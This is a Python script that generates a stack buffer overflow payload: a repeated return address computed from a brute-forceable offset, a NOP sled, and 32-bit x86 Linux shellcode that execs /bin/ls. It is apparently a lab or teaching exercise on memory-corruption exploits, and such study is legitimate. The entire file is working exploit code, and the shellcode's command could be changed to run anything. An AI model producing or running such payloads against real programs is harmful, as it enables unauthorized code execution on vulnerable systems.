import sys
import os

offset = int(sys.argv[1])

NOPSLED = bytes.fromhex('90')
NOPSLED = NOPSLED * 0xF

SHELLCODE = b"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/ls"

RETURNADDRESS = b"bffdf000"
RETURNADDRESS = int(RETURNADDRESS, 16) + 0x20 * offset
RETURNADDRESS = RETURNADDRESS.to_bytes(4, 'little')
RETURNADDRESSBLOCK = RETURNADDRESS * 0x20

with os.fdopen(sys.stdout.fileno(), "wb", closefd=False) as stdout:
    stdout.write(RETURNADDRESSBLOCK + NOPSLED + SHELLCODE + RETURNADDRESSBLOCK + B'\n')

with os.fdopen(sys.stderr.fileno(), "w", closefd=False) as stderr:
    stderr.write(RETURNADDRESS.hex() + "\n")